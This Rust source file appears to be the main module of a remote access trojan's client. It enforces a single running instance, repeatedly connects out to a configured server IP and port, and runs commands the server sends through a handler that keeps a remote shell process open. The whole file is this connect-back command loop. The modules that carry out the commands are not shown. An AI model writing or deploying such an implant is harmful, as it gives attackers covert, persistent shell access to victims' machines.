

use std::net::TcpStream;
use std::path::PathBuf;
use std::process::Child;
use std::sync::{Arc, Mutex};
use std::thread::sleep;

pub mod features;
pub mod handler;
pub mod service;
pub mod settings;

use handler::handle_command;
use common::buffers::read_buffer;


fn handle_server(mut read_stream: TcpStream, mut write_stream: TcpStream, is_connected: Arc<Mutex<bool>>) {
    let mut remote_shell: Option<Child> = None;

    let mut current_path = PathBuf::new();

    loop {
        let received = read_buffer(&mut read_stream);
        match received {
            Ok(bytes) => {
                let command_str = String::from_utf8_lossy(&bytes);
                let commands = command_str.trim().split('\n').collect::<Vec<_>>();
                for command in commands {
                    handle_command(&mut write_stream, command, &mut remote_shell, &mut current_path);
                }
            }
            Err(_) => {
                println!("Disconnected!");
                if let Some(shell) = remote_shell.as_mut() {
                    let _ = shell.kill();
                }
                {
                    let mut is_connected_guard = is_connected.lock().unwrap();
                    *is_connected_guard = false;
                }
                break;  
            }
        }
    }
}


fn main() {
    service::mutex::mutex_lock();
    let is_connected = Arc::new(Mutex::new(false));

    loop {
        let is_connected_clone = is_connected.clone();
        if *is_connected_clone.lock().unwrap() {
            sleep(std::time::Duration::from_secs(5));
            continue;
        }

        std::thread::spawn(move || {
            println!("Connecting to server...");
            let stream = TcpStream::connect(format!("{}:{}", settings::IP, settings::PORT));
            if let Ok(str) = stream {
                {
                    let mut is_connected_guard = is_connected_clone.lock().unwrap();
                    *is_connected_guard = true;
                }
                handle_server(str.try_clone().unwrap(), str.try_clone().unwrap(), is_connected_clone);
            };
        });
        sleep(std::time::Duration::from_secs(5));
    }
}